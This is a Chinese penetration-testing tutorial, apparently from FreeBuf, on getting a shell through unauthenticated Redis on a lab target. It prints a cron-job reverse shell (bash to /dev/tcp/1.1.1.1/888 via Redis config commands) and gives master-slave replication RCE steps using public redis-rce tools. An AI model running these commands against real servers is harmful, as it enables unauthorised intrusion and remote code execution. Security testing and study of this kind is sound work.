**你是我患得患失的梦，我是你可有可无的人，毕竟这穿越山河的箭，刺的都是用情之疾的人。**

##  **前言：**

当我们接到一个授权渗透测试的时候，常规漏洞如注入、文件上传等尝试无果后，扫描端口可能会发现意外收获。

##  **知己知彼乃百战不殆，Redis介绍：**

简单来说 redis 就是一个Key-Value类型的数据库， redis
所有数据全部在内存中进行操作，并且它可以将内存中的数据定期存储在磁盘中，并且支持保存多种数据结构(String、hash、list等)。

##  **运筹帷幄之中，Redis漏洞：**

###  ****1、未授权访问漏洞****

Redis在默认情况下，会绑定在0.0.0.0:6379，如果没有采用限制IP访问，就会将Redis服务暴露在公网上，并且在没有设置密码认证的情况下，会导致任意用户未授权访问Redis以及读取Redis数据并写入公钥进行远程连接等。

当拿到数据库权限是不会满足我们的，我们的目标只有一个getshell！

目前较主流的两个方法，第一种定时计划反弹shell、第二种利用主从复制rce。

###  **2、定时计划反弹shell**

> 1）set x "\n* * * * * bash -i >& /dev/tcp/1.1.1.1/888 0>&1\n"
>
> 2）config set dir /var/spool/cron/
>
> 3）config set dbfilename root
>
> 4）save

###  **3、利用主从复制rce**

漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在Reids
4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。

需要利用一个工具，GitHub下载即可。

> 1）git clone <https://github.com/n0b0dyCN/RedisModules-> ExecuteCommand>（需要make）
>
> 2）git clone <https://github.com/Ridter/redis-rce.git>

进而通过未授权访问或者弱口令连接redis，执行脚本即可获取shell。  
![](https://image.3001.net/images/20191231/1577761671_5e0abb87b8407.png!small)

##  **决胜千里之外，实战演练：**

本次扫到了6379也就是Redis，有的时候可能或改默认端口，建议全端口扫描,本次利用主从复制rce获取shell(由于该漏洞已提交src，签约保密协议，故搭建靶机还原真实环境，保证原汁原味。)

> 攻击端ip：192.168.109.134
>
> 服务端ip：192.168.109.136

![](https://image.3001.net/images/20191231/1577761806_5e0abc0e014db.png!small)通过未授权访问连接redis（如果有密码，可以尝试爆破，authpassword
登陆系统）：Redis-cli –h ip  
![](https://image.3001.net/images/20191231/1577761848_5e0abc38b62e4.png!small)利用主从复制rce获取shell

首先要生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。  
![](https://image.3001.net/images/20191231/1577761875_5e0abc5388210.png!small)攻击端执行：

python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so

成功获取shell  
![](https://image.3001.net/images/20191231/1577762127_5e0abd4f9eddc.png!small)

##  **总结：**

其实最难得还是需要细心，日常有授权测试的时候不要轻易放过任何数据包，以及一些js文件，它通常会给你带来很多意外的惊喜。执着是好事，但是不能太钻牛角尖，如果一个方面实在行不通的话，可以换条路走，毕竟条条大路最终都是通罗马的。

 ***本文作者：ch8411，转载请注明来自FreeBuf.COM**

